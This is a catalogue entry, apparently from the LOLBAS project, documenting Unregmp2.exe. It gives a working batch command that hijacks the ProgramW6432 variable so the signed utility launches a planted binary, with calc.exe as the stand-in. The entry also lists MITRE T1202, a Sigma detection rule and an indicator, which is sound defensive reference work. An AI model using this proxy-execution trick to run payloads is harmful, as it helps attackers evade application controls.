---
Acknowledgement:
- Person: Wade Hic
Author: Wade Hickey
Commands:
- Category: Execute
  Command: rmdir %temp%\lolbin /s /q 2>nul & mkdir "%temp%\lolbin\Windows Media Player"
    & copy C:\Windows\System32\calc.exe "%temp%\lolbin\Windows Media Player\wmpnscfg.exe"
    >nul && cmd /V /C "set "ProgramW6432=%temp%\lolbin" && unregmp2.exe /HideWMP"
  Description: Allows an attacker to copy a target binary to a controlled directory
    and modify the 'ProgramW6432' environment variable to point to that controlled
    directory, then execute 'unregmp2.exe' with argument '/HideWMP' which will spawn
    a process at the hijacked path '%ProgramW6432%\wmpnscfg.exe'.
  MitreID: T1202
  OperatingSystem: Windows 10
  Privileges: User
  Tags:
  - Execute: EXE
  Usecase: Proxy execution of binary
Created: 2021-12-06
Description: Microsoft Windows Media Player Setup Utility
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/197615345b927682ab7ad7fa3c5f5bb2ed911eed/rules/windows/process_creation/proc_creation_win_lolbin_unregmp2.yml
- IOC: Low-prevalence binaries, with filename 'wmpnscfg.exe', spawned as child-processes
    of `unregmp2.exe /HideWMP`
Full_Path:
- Path: C:\Windows\System32\unregmp2.exe
- Path: C:\Windows\SysWOW64\unregmp2.exe
Name: Unregmp2.exe
Resources:
- Link: https://twitter.com/notwhickey/status/1466588365336293385
mitre_data:
  technique_ids:
  - T1202
tags:
- lolbas/osbinaries
---

# Unregmp2.exe

Microsoft Windows Media Player Setup Utility

# Path(s)

- `C:\Windows\System32\unregmp2.exe`
- `C:\Windows\SysWOW64\unregmp2.exe`

# Execute Commands

Allows an attacker to copy a target binary to a controlled directory and modify the 'ProgramW6432' environment variable to point to that controlled directory, then execute 'unregmp2.exe' with argument '/HideWMP' which will spawn a process at the hijacked path '%ProgramW6432%\wmpnscfg.exe'.

```batch
rmdir %temp%\lolbin /s /q 2>nul & mkdir "%temp%\lolbin\Windows Media Player" & copy C:\Windows\System32\calc.exe "%temp%\lolbin\Windows Media Player\wmpnscfg.exe" >nul && cmd /V /C "set "ProgramW6432=%temp%\lolbin" && unregmp2.exe /HideWMP"
```

- **Usecase:** Proxy execution of binary
- **Privileges Required:** User
- **MitreID:** `T1202`
- **Operating System(s):** Windows 10



# Resource(s)

- https://twitter.com/notwhickey/status/1466588365336293385
# Acknowledgements

- Wade Hickey (Authored, 2021-12-06)
- Wade Hic